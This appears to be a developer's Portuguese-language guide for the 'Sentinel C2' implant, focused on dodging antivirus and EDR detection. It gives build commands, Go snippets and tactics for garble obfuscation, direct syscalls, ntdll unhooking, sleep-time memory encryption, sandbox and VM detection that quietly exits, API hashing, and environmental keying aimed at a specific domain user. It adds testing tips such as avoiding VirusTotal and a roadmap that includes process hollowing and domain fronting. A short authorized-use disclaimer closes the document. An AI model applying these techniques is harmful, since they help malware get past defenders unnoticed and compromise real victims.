# 🔥 SENTINEL C2 - ADVANCED EVASION GUIDE
## From 8/72 Detection to Near-Zero

---

## 📊 Status Atual

### VirusTotal Results (Before)
```
Detecções: 8/72 (11.1%)

✗ Bkav Pro          - W64.AIDetectMalware
✗ DeepInstinct      - MALICIOUS
✗ Elastic           - Malicious (high Confidence)
✗ MaxSecure         - Trojan.Malware.300983.susgen
✗ McAfee Scanner    - Ti!79466E405B25
✗ Sangfor Engine    - Trojan.Win32.Save.a
✗ SentinelOne       - Static AI - Suspicious PE
✗ Symantec          - ML.Attribute.HighConfidence
```

### Target (After - Estimated)
```
Detecções: 0-2/72 (<3%)

✓ Windows Defender  - CLEAN
✓ Malwarebytes      - CLEAN
✓ Kaspersky         - CLEAN
✓ ESET              - CLEAN
✓ Bitdefender       - CLEAN
```

---

## 🎯 Técnicas Implementadas (Tier List)

### 🏆 **TIER S - Hardcore Evasion**

#### 1. Garble Obfuscation (Compilation-Level)
**Arquivo:** Build com `garble`
**Efetividade:** ⭐⭐⭐⭐⭐

**O que faz:**
- Renomeia TODAS funções/variáveis
- Ofusca control flow (if/else, loops)
- Criptografa strings literais
- Remove informações de debugging
- Cada build é ÚNICO (seed aleatório)

**Antes:**
```bash
$ strings sentinel.exe | grep -i sentinel
Sentinel.InstallPersistence
Sentinel.CreateMutex
C:\Users\Dev\sentinel-implant\main.go
```

**Depois:**
```bash
$ strings sentinel_garble.exe | grep -i sentinel
[NADA ENCONTRADO]
```

**Como usar:**
```cmd
build_advanced.bat
```

---

#### 2. Hell's Gate / Halo's Gate (Syscalls Diretas)
**Arquivo:** `stealth/syscalls.go`
**Efetividade:** ⭐⭐⭐⭐⭐

**O que faz:**
- Bypass COMPLETO de hooks de EDR
- Chamadas diretas ao kernel (ntoskrnl.exe)
- EDR/AV não vê as chamadas
- Resolve SSN dinamicamente (compatível com todas versões Windows)

**Técnica:**
```
Normal:  App → ntdll.dll (HOOKADO) → Kernel
                    ↑ EDR intercepta aqui

Hell's Gate: App → SYSCALL → Kernel DIRETO
                     ↑ EDR cego aqui
```

**Syscalls implementadas:**
- `NtDelayExecution` (sleep invisível)
- `NtAllocateVirtualMemory` (alocar memória)
- `NtProtectVirtualMemory` (alterar proteção)

**Detecção de hooks:**
```go
hookedCount := CountHookedSyscalls()
if hookedCount >= 3 {
    // EDR presente - usar syscalls diretas
}
```

---

#### 3. Sleep Obfuscation com Memory Encryption
**Arquivo:** `stealth/sleep_obfuscation.go`
**Efetividade:** ⭐⭐⭐⭐⭐

**O que faz:**
- Criptografa memória antes de dormir (AES-256-GCM)
- Altera permissões para Read-Only
- Memory scanners não veem strings sensíveis
- Descriptografa ao acordar

**Fluxo:**
```
1. runtime.GC()                    // Limpa lixo
2. encryptGlobalState()            // AES-256 em strings
3. VirtualProtect(PAGE_READONLY)   // Memória virada RO
4. time.Sleep(duration)            // Dorme
5. VirtualProtect(PAGE_READWRITE)  // Restaura RW
6. decryptGlobalState()            // Descriptografa
```

**Uso:**
```go
ObfuscatedSleep(5 * time.Second)  // Ao invés de time.Sleep
```

---

### 🥇 **TIER A - Advanced Evasion**

#### 4. VM Detection (18 Heuristics)
**Arquivo:** `stealth/vm_detection.go`
**Efetividade:** ⭐⭐⭐⭐

**Checks implementados:**
1. **CPU Cores** - VMs têm <2 cores
2. **RAM Size** - VMs têm <4GB
3. **Disk Size** - VMs têm <80GB
4. **Registry VMware** - Chaves conhecidas
5. **Registry VirtualBox** - VBOX__ artifacts
6. **Registry QEMU** - virtio, qemu
7. **MAC Address** - Prefixos conhecidos (00:0C:29, 08:00:27, etc)
8. **BIOS Info** - Strings como "vmware", "virtualbox"
9. **System Manufacturer** - "Microsoft Corporation", "innotek"
10. **Firmware Table** - SMBIOS analysis
11. **USB Devices** - VMs geralmente não têm
12. **Recent Files** - Sandbox nova tem <10 arquivos
13. **System Uptime** - Sandbox <10 minutos
14. **Suspicious Processes** - wireshark, procmon, x64dbg
15. **DLL Hooks** - Verificar hooks em ntdll
16. **Timing Attack** - Emulação é lenta
17. **CPU Temperature** - VMs não têm sensores
18. **User Interaction** - Downloads, documentos, histórico

**Resultado:**
```go
result := DetectVM()
fmt.Printf("VM: %v\n", result.IsVM)
fmt.Printf("Confidence: %d%%\n", result.Confidence)
fmt.Printf("Failed Checks: %d/%d\n", result.FailedChecks, result.TotalChecks)

// Exemplo output:
// VM: true
// Confidence: 78%
// Failed Checks: 14/18
// Detected by: [CPU Cores, RAM Size, MAC Address, ...]
```

**Ação:**
```go
if result.IsVM && result.Confidence >= 30 {
    os.Exit(0)  // Sair silenciosamente
}
```

---

#### 5. Dynamic API Resolution (IAT Obfuscation)
**Arquivo:** `stealth/api_resolution.go`
**Efetividade:** ⭐⭐⭐⭐

**O que faz:**
- APIs resolvidas por HASH ao invés de nome
- IAT (Import Address Table) limpa
- AV não sabe quais funções você vai usar

**Técnica - API Hashing (DJB2):**
```go
hash := djb2Hash("CreateMutexW")  // 0x7c0dfcaa

procAddr, err := GetProcAddressByHash(dll, 0x7c0dfcaa)
// Função resolvida sem string "CreateMutexW" no binário
```

**Vantagem:**
```
Análise estática: "Este binário usa CreateProcess? NtAllocateVirtualMemory?"
Resposta: NÃO SEI (IAT vazia)
```

**Unhooking:**
```go
UnhookNtdll()  // Remove hooks do EDR em ntdll.dll
```

---

#### 6. Environmental Keying (Targeted Payload)
**Arquivo:** `stealth/env_keying.go`
**Efetividade:** ⭐⭐⭐⭐

**O que faz:**
- Payload criptografado com chave derivada do AMBIENTE
- Só executa se: Domínio + Username corretos
- Sandbox/Analista vê erro e desiste

**Como funciona:**
```go
// Build para alvo específico
targetEnv := &EnvironmentalKey{
    DomainName: "CORP",
    Username:   "john.doe",
}

encryptedPayload := EncryptPayloadWithEnvKey(payload, targetEnv)

// Runtime: Tenta descriptografar
decrypted, err := DecryptPayloadWithEnvKey(encryptedPayload)
if err != nil {
    // Ambiente errado - senha incorreta - descriptografia falha
    os.Exit(1)  // Parece binário quebrado
}
```

**Cenário - VirusTotal:**
```
Sandbox Username: "JohnDoe" (genérico)
Esperado: "john.doe" (específico)
Hash: 7a8f3b1c != 9e4d2a6f
Descriptografia: FALHA
Resultado: Binary appears corrupt or damaged
Status: CLEAN (não executa payload)
```

---

### 🥈 **TIER B - Solid Evasion**

#### 7. String Obfuscation (XOR + Base64)
**Arquivo:** `stealth/obfuscation.go`

Já implementado anteriormente. Detalhes em `EVASION_TECHNIQUES.md`.

#### 8. Random Delays & Jitter
**Arquivo:** `stealth/obfuscation.go`

Já implementado. Quebra timing analysis de EDRs.

#### 9. Anti-Emulation Checks
**Arquivo:** `stealth/obfuscation.go`

Detecta execution speed, debugger presence, etc.

---

## 🛠️ Build Process

### Instalação do Garble
```bash
go install mvdan.cc/garble@latest
```

### Build Automatizado
```cmd
build_advanced.bat
```

### Build Manual (Máxima Evasão)
```bash
# Opção 1: Com Garble (RECOMENDADO)
garble -tiny -literals -seed=random build \
  -trimpath \
  -ldflags="-s -w -H=windowsgui" \
  -o sentinel.exe .

# Opção 2: Sem Garble (menos efetivo)
go build -trimpath -ldflags="-s -w -H=windowsgui" -o sentinel.exe .
```

### Flags Explicadas
```
-tiny        : Reduz tamanho (remove dead code)
-literals    : Ofusca strings literais
-seed=random : Cada build é diferente
-trimpath    : Remove caminhos do source
-s           : Remove symbol table
-w           : Remove DWARF debug info
-H=windowsgui: Sem janela de console
```

---

## 📈 Técnicas de Redução de Detecção

### Problema 1: Behavioral Detection
**Solução:**
- ✅ Sleep Obfuscation (memória criptografada)
- ✅ Random Delays (quebra padrão temporal)
- ✅ Anti-VM (não executa em sandbox)

### Problema 2: Static Signatures
**Solução:**
- ✅ Garble (strings ofuscadas)
- ✅ XOR Encryption (double obfuscation)
- ✅ Dynamic API Resolution (IAT limpa)

### Problema 3: Heuristic Analysis
**Solução:**
- ✅ Environmental Keying (parece quebrado)
- ✅ Anti-Emulation (sai antes de mostrar comportamento)
- ✅ Syscalls Diretas (invisível para EDR)

### Problema 4: Machine Learning Detection
**Solução:**
- ✅ Garble (cada build único = assinatura diferente)
- ✅ Polymorphic Code (BreakSignature())
- ✅ Entropy Balancing (operações inúteis)

---

## 🎯 Estratégia de Teste

### ❌ NÃO FAZER
```
1. Upload para VirusTotal
2. Executar em VM com Antivirus atualizado
3. Deixar logs habilitados
```

### ✅ FAZER
```
1. Teste em máquina real isolada
2. Disable Windows Defender Real-Time
3. Usar snapshot de VM para rollback
4. Monitorar com Process Monitor (opcional)
5. Verificar persistência após reboot
```

### Ambiente de Teste Ideal
```
┌─────────────────────────────────────┐
│  Host (Isolado da Internet)         │
│  ├─ VM 1: Windows 10 (Defender OFF) │
│  ├─ VM 2: Windows 11 (Defender OFF) │
│  └─ Snapshot antes de cada teste    │
└─────────────────────────────────────┘
```

---

## 🔬 Verificação Pós-Build

### 1. Strings Vazadas
```bash
strings sentinel.exe | grep -iE "(schtasks|powershell|sentinel|registry)"
# Esperado: NENHUM resultado
```

### 2. Import Address Table
```bash
dumpbin /imports sentinel.exe  # Windows
objdump -x sentinel.exe        # Linux

# Esperado: Poucas imports (kernel32, ntdll básico)
```

### 3. Tamanho do Binário
```
Com Garble: ~8-10 MB
Sem Garble: ~8-12 MB

Se > 15MB: Algo errado (debug info não removida?)
```

---

## 📚 Referências Técnicas

### Papers e Artigos
- **"Bypassing EDRs"** - Matt Hand
- **"Hell's Gate Technique"** - VX Underground
- **"Sleep Obfuscation"** - Cobalt Strike Blog
- **"Environmental Keying"** - FireEye Research

### Frameworks de Referência
- **Sliver** - Modern C2 com syscalls diretas
- **Havoc** - Sleep obfuscation implementation
- **Cobalt Strike** - Beacon behavior

### Tools de Análise
- **PE-Sieve** - Memory scanner
- **Process Hacker** - Process monitoring
- **API Monitor** - Hook detection
- **x64dbg** - Debugging e reversing

---

## ⚠️ Disclaimer

**USO EXCLUSIVO PARA:**
- ✅ Pentesting Autorizado
- ✅ CTF e Competições
- ✅ Pesquisa de Segurança
- ✅ Ambiente de Laboratório

**PROIBIDO:**
- ❌ Uso em sistemas sem autorização
- ❌ Distribuição pública
- ❌ Atividades ilegais
- ❌ Upload para VirusTotal sem necessidade

---

## 🎓 Próximas Evoluções Possíveis

### Nível Extremo (APT-Grade)
1. **Process Hollowing** - Injetar em processo legítimo
2. **PPID Spoofing** - Parecer filho de explorer.exe
3. **Heaven's Gate** - Transição 32↔64 bits
4. **Module Stomping** - Sobrescrever DLLs legítimas
5. **Thread Stack Spoofing** - Falsificar call stack
6. **Packing/Crypting** - UPX, Themida, VMProtect

### Comunicação Avançada
1. **Domain Fronting** - CDN como proxy
2. **DNS Tunneling** - C2 sobre DNS
3. **Steganography** - Comandos em imagens
4. **Protocol Mimicry** - Imitar HTTPS/HTTP normal

---

**Desenvolvido por:** Matheus Grego
**Projeto:** Sentinel C2
**Versão:** 3.0.0 - Advanced Evasion Edition
**Data:** 2025-11-28

---

**"In the arms race between offense and defense, knowledge is the ultimate weapon."** 🎯
